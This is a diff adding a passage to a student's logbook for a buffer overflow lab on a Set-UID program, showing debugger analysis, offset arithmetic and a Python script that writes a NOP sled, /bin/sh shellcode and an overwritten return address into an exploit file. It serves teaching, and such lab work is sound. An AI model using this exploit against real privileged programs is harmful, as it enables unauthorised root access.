@@ -26,4 +26,52 @@ Buffer Overflow Attack Lab (Set-UID Version)
 
 ### **Task 3: Launching Attack on 32-bit Program (Level 1)** 
 
+- First ran the debug version of the program to understand the locations of each variable in the Stack. We used a break point in the function where the overflow is possible to analyze the addresses at that point in the program execution
+
+![Terminal print task3](/images/Logbook5%20images/task31.png)
+
+![Terminal print task3](/images/Logbook5%20images/task32.png)
+
+Then, changed the variables in the python script. This script will output to a file the contents to be written on the buffer to overflow
+
+- Changed the offset to 112, which is the distance between the start of the buffer and the return address that we want to rewrite (ebp - buffer) + 4bits = 108 + 4 = 112 
+
+- Changed the ret value to the address to which we want the program to jump to
+
+- Changed the start value to match the start of the shellcode in the buffer with the position the program is going to jump to
+
+**Python Script**
+
+``` python
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517- len(shellcode)               # Change this number
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value
+# and put it somewhere in the payload
+ret    = 0xffffcabc     # Change this number
+offset = 112           # Change this number
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+    f.write(content)
+```
 
